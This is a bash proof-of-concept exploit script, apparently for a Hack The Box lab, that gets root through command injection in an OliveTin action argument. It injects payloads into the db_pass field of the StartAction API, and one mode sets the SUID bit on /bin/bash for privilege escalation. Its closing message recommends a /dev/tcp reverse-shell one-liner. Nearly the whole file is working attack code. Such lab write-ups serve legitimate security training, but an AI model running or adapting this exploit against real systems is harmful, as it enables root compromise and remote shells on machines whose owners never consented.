#!/usr/bin/env bash
# HTB Enigma — OliveTin unescaped action argument -> command injection as root
# Source: enigma.txt   |   Arsenal ref: §1.3
#
# OliveTin binds 127.0.0.1:1337 and runs as root. The shipped config disables guest
# login and defaults exec to true, and the backup action interpolates {{ db_pass }}
# directly into a shell string:
#     shell: "mysqldump -u {{ db_user }} -p'{{ db_pass }}' {{ db_name }} > ..."
# A single quote in db_pass closes the -p'...' argument and the rest is shell.
#
# Run from the haris shell on the box.
#
# Usage:
#   ./poc_htb_olivetin_rce.sh --list
#   ./poc_htb_olivetin_rce.sh --action backup_database --check
#   ./poc_htb_olivetin_rce.sh --action backup_database --command 'id'
#   ./poc_htb_olivetin_rce.sh --action backup_database --suid

set -u
HOST="${OLIVETIN_HOST:-127.0.0.1}"
PORT="${OLIVETIN_PORT:-1337}"
ACTION=""; CMD=""; MODE="rce"

while [ $# -gt 0 ]; do
  case "$1" in
    --list)    MODE="list"; shift ;;
    --check)   MODE="check"; shift ;;
    --suid)    MODE="suid"; shift ;;
    --action)  ACTION="$2"; shift 2 ;;
    --command) CMD="$2";    shift 2 ;;
    *) echo "unknown arg: $1" >&2; exit 2 ;;
  esac
done

API="http://$HOST:$PORT/api"

if [ "$MODE" = "list" ]; then
  echo "[*] actions exposed to guests:"
  curl -s --max-time 10 "$API/Actions" | tr ',' '\n' | grep -i -E '"bindingId"|"title"' | head -40
  echo
  echo "[*] if this returns JSON without an auth error, guests can execute actions."
  exit 0
fi

if [ -z "$ACTION" ]; then
  echo "[-] --action <bindingId> required (use --list to discover)" >&2
  exit 2
fi

start() {
  # $1 = argument map JSON
  curl -s --max-time 15 -X POST "$API/StartAction" \
    -H 'Content-Type: application/json' \
    -d "{\"actionId\":\"$ACTION\",\"arguments\":$1}"
  echo
}

case "$MODE" in
  check)
    echo "[*] baseline with a benign argument (does the action accept guest exec?)"
    start '{"db_user":"root","db_pass":"x","db_name":"mysql"}'
    ;;
  suid)
    # Escaped quite carefully: closes -p'...' then runs the payload, comments the rest.
    PAYLOAD="'; chmod 4755 /bin/bash; echo '"
    echo "[*] injecting SUID-bash payload via db_pass"
    start "$(printf '{"db_user":"root","db_pass":"%s","db_name":"mysql"}' "$PAYLOAD")"
    echo "[*] verify: ls -l /bin/bash   (expect -rwsr-xr-x);  then: /bin/bash -p"
    ;;
  rce)
    [ -z "$CMD" ] && { echo "[-] --command required" >&2; exit 2; }
    LHOST=""; LPORT=""
    if printf '%s' "$CMD" | grep -q 'LHOST'; then
      echo "[-] replace LHOST/LPORT placeholders in --command before sending" >&2
      exit 2
    fi
    PAYLOAD="'; $CMD; echo '"
    echo "[*] injecting: $PAYLOAD"
    start "$(printf '{"db_user":"root","db_pass":"%s","db_name":"mysql"}' "$PAYLOAD")"
    echo "[i] output lands in OliveTin's action log; the API returns only a status."
    echo "    For a shell, use a reverse-shell command:  bash -c 'bash -i >& /dev/tcp/<IP>/<PORT> 0>&1'"
    ;;
esac
